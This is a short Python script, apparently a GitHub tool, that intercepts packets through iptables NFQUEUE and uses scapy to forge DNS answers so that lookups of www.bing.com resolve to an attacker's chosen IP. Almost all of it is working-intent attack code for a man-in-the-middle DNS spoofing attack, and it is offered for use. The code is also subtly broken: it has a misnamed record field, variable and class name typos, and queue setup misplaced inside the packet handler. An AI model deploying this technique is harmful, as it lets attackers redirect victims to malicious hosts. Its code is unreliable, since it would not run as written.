#!usr/bin/python
"""
note: run ip tables
iptables -I INPUT -j NFQUEUE --queue-num 0 this is for testing on your computer
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0 this is for testing on another computer to let the packets flow
"""
#TOOL IS CREATED BY KRISNA PRANAV
#Github Link https://www.github.com/krishpranav

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rename=qname, rdata="target ip address")
            scapy_packet[scapy.DNS].an = answer
            scapy_packetp[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

        packet.accept()

        queue = netfilterqueue.Netfilterqueue()
        queue().bind(0, process_packet)
        queue.run()
